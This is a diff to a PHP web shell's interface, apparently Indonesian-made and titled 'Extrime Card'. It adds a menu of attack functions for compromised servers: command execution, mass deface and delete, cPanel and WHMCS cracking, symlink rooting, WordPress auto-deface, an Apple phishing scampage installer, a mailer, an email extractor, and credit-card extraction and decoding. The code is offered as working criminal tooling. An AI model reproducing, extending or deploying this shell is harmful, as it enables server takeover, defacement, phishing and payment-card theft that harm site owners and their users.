@@ -1,4 +1,4 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><title> >-|I|-> Extrime |  Card <-|I|-< </title><link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
+ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><title> >-|I|-> Extrime |  Card <-|I|-< </title><link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
 <font class="hk2" style="text-shadow: 1px -1px 8px;"><style>
 body {
 	font-family: 'Arial'; font-size:12px;color:lime;
@@ -78,6 +78,50 @@ body {
 @ini_set('max_execution_time',0); 
 @ini_set('display_errors', 0);
 @set_time_limit(0); 
+echo "<table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'>
+		<tr>
+		<th class='th_home'>";
+echo "<ul>";
+echo "| <a href='?'><input class='button' type='button' value=Home></a>
+| <a href='?dir=$dir&do=upload'><input class='button' type='button' value=Upload></a>
+| <a href='?dir=$dir&do=cmd'><input class='button' type='button' value=Command></a> 
+| <a href='?dir=$dir&do=mass_deface'><input class='button' type='button' value=Mass Deface></a> 
+| <a href='?dir=$dir&do=mass_delete'><input class='button' type='button' value=Mass Delete></a> 
+| <a href='?dir=$dir&do=config'><input class='button' type='button' value=Config></a> 
+| <a href='?dir=$dir&do=jumping'><input class='button' type='button' value=Jumping></a> 
+| <a href='?dir=$dir&do=cpanel'><input class='button' type='button' value=CPanel Crack></a> 
+| <a href='?dir=$dir&do=smtp'><input class='button' type='button' value=SMTP Grabber></a> 
+|<a href='?dir=$dir&do=UaeZ'><input class='button' type='button' value=Upload Extract-Zip></a>
+|<a href='?dir=$dir&do=CpC'><input class='button' type='button' value=CPanel Croot></a>
+|<a href='?dir=$dir&do=UdMs'><input class='button' type='button' value=User Domain></a>
+|<a href='?dir=$dir&do=SmpK'><input class='button' type='button' value=Symlink Crack-CPanel></a>
+|<a href='?dir=$dir&do=RmDs'><input class='button' type='button' value=Rooting Massdeface></a>
+|<a href='?dir=$dir&do=SwPJmPL'><input class='button' type='button' value=Scaner Plugin WP JM ></a>
+|<a href='?dir=$dir&do=Whmcz211'><input class='button' type='button' value=Brute Whmcs></a>
+|<a href='?dir=$dir&do=XdRpLs'><input class='button' type='button' value=Xmas-Drupal></a>
+|<a href='?dir=$dir&do=SloROkaN'><input class='button' type='button' value=Slorokan></a> ";
+
+echo "| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Zone-H></a> 
+| <a href='?dir=$dir&do=SbN'><input class='button' type='button' value=Sabun></a> 
+| <a href='?dir=$dir&do=cgi'><input class='button' type='button' value=CGI Telnet></a> 
+| <a href='?dir=$dir&do=network'><input class='button' type='button' value=network></a> 
+| <a href='?dir=$dir&do=adminer'><input class='button' type='button' value=Adminer></a> <br>
+| <a href='?dir=$dir&do=fake_root'><input class='button' type='button' value=Fake Root></a> 
+| <a href='?dir=$dir&do=auto_edit_user'><input class='button' type='button' value=Auto Edit User></a> 
+| <a href='?dir=$dir&do=auto_wp'><input class='button' type='button' value=Auto Edit Title WordPress></a> 
+| <a href='?dir=$dir&do=auto_dwp'><input class='button' type='button' value=WordPress Auto Deface></a> 
+| <a href='?dir=$dir&do=auto_dwp2'><input class='button' type='button' value=WordPress Auto Deface V.2></a>
+|<a href='?dir=$dir&do=installtmp'><input class='button' type='button' value=Install Api></a>
+|<a href='?dir=$dir&do=scmpg'><input class='button' type='button' value=Scampage Appel></a>
+|<a href='?dir=$dir&do=extract=unzip tmp.zip'><input class='button' type='button' value=Extract Api></a>
+|<a href='?dir=$dir&do=extract=unzip AppleID.zip'><input class='button' type='button' value=Extract Appel></a>
+|<a href='?dir=$dir&do=M'><input class='button' type='button' value=Mailer></a>
+|<a href='?dir=$dir&do=ExE'><input class='button' type='button' value=Email Extractor></a>
+|<a href='?dir=$dir&do=PmE'><input class='button' type='button' value=Pemisah Email></a>
+|<a href='?dir=$dir&do=ExTrPCc'><input class='button' type='button' value=Extrap CC></a>
+<a href='?dir=$dir&do=DdCc'><input class='button' type='button' value=Decode CC></a>| ";
+echo "</ul>";
+echo "</th></tr>";
 echo '<img src="https://3.bp.blogspot.com/-wLJw_NlOn7E/VzC1NVdwv9I/AAAAAAAAARE/DGLXUsdr8902CG_3y1zR7Em2uvadBG1IACLcB/s1600/sangar.jpg" width="0" height="0">';
 {
 echo "
